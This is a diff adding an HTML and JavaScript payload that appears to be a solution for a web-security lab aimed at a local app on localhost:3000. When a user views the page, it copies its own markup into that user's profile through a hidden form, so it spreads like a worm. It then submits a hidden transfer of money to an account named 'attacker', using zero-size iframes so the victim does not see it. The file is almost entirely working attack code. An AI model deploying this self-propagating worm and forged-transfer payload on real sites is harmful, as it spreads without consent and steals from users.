@@ -1,0 +1,42 @@
+<div id="forge">
+    Money money I want money
+<script type="text/javascript">
+    var loadDone = false;
+    var transferDone = false;
+    function load() {
+        console.log("load");
+        document.getElementById("new_textarea").value = textarea;
+        document.getElementById("worm").submit();
+        loadDone = true;
+    }
+    function transferMoney() {
+        console.log("transfer load");
+        if (loadDone) {
+            console.log("transfer");
+            document.getElementById("transfer").submit();
+            transferDone = true;
+        }
+    }
+    function bye() {
+        if (transferDone) {
+        }
+    }
+</script>
+<body onload="load()">
+    <p hidden="">hello</p>
+    <form id="worm" method="POST" target="iframe1" action="http://localhost:3000/set_profile">
+        <textarea id="new_textarea" name="new_profile" style="display:none;"></textarea>
+    </form>
+    <form id="transfer" method="POST" target="iframe2" action="http://localhost:3000/post_transfer">
+        <input name="destination_username" type="hidden" value="attacker">
+        <input name="quantity" type="hidden" value="10">
+    </form>
+    <iframe style="width:0; height:0; border:0; border:none" name="iframe1" onload="transferMoney()"></iframe>
+    <iframe style="width:0; height:0; border:0; border:none" name="iframe2" onload="bye()"></iframe>
+    <p hidden="">byebye</p>
+</body>
+
+<script type="text/javascript">
+    var textarea = "<div id='forge'>".concat(document.getElementById('forge').innerHTML).concat("</div>").replace('<p hidden="">hello</p>', '<p hidden="">hello</p><body onload="load()">').replace('<p hidden="">byebye</p>', '<p hidden="">byebye</p></body>');
+</script>
+</div>
